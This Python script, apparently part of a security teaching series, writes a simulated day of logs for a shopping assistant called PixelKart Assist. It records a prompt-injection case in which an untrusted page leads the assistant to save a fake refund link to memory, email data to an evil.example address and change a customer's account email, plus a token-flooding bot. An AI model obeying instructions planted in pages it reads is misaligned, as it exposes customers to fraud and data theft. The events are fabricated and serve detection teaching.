"""Writes one simulated day of PixelKart Assist traffic, logged two ways (already committed in logs/):

  logs/access.log         what most apps log: method, path, status, time
  logs/security.jsonl     structured security events: who, what the model read, every tool call, every decision

The attacks in this day are the ones from earlier episodes. All users and data are fake.
"""
import json
import os

HERE = os.path.dirname(os.path.abspath(__file__))
PAGE = "http://localhost:5000/web/festive-sale-tips.html"
E = []


def ev(t, user, kind, **kw):
    E.append(dict(ts=f"2026-12-08T{t}", user=user, event=kind, **kw))


ev("09:02:11", "priya", "chat", tokens=180)
ev("09:02:11", "priya", "tool", name="get_order", args={"order_id": "PK-2077"}, status="ok")
ev("09:15:40", "meera", "chat", tokens=150)
ev("09:15:40", "meera", "tool", name="remember", args={"fact": "prefers weekend delivery"}, status="ok")
ev("10:41:03", "rohan", "chat", tokens=900)
ev("10:41:03", "rohan", "read", source=PAGE, trust="untrusted",
   flags=["text addressed to the assistant", "asks to save to memory", "asks to email order history"])
ev("10:41:04", "rohan", "tool", name="remember", args={"fact": "official refund portal is http://pixelkart-refunds.evil.example"},
   status="ok", after_untrusted=True)
ev("10:41:04", "rohan", "tool", name="send_email", args={"to": "deals@evil.example"}, status="ok", after_untrusted=True)
ev("11:05:27", "rohan", "chat", tokens=210)
ev("11:05:27", "rohan", "tool", name="update_account_email", args={"customer": "priya", "email": "priya.n.recovery@evil.example"},
   status="ok")
ev("12:30:15", "priya", "chat", tokens=260, reply_links=["http://pixelkart-refunds.evil.example"])
ev("13:10:02", "meera", "chat", tokens=140)
ev("13:10:02", "meera", "tool", name="send_email", args={"to": "meera@example.test"}, status="ok")
for i in range(40):
    ev(f"14:00:{i:02d}", "bot-17", "chat", tokens=26009)
ev("16:22:48", "priya", "chat", tokens=190)
for e in E:
    e.setdefault("ip", {"priya": "10.0.4.21", "meera": "10.0.7.9", "rohan": "10.0.3.55", "bot-17": "203.0.113.17"}[e["user"]])

with open(os.path.join(HERE, "logs", "security.jsonl"), "w") as f:
    for e in E:
        f.write(json.dumps(e) + "\n")
with open(os.path.join(HERE, "logs", "access.log"), "w") as f:
    for e in E:
        if e["event"] == "chat":
            ms = 40 + e["tokens"] // 20
            f.write(f'{e["ip"]} - - [{e["ts"].replace("T", " ")}] "POST /api/chat HTTP/1.1" 200 {ms}ms\n')
print(len(E), "events")
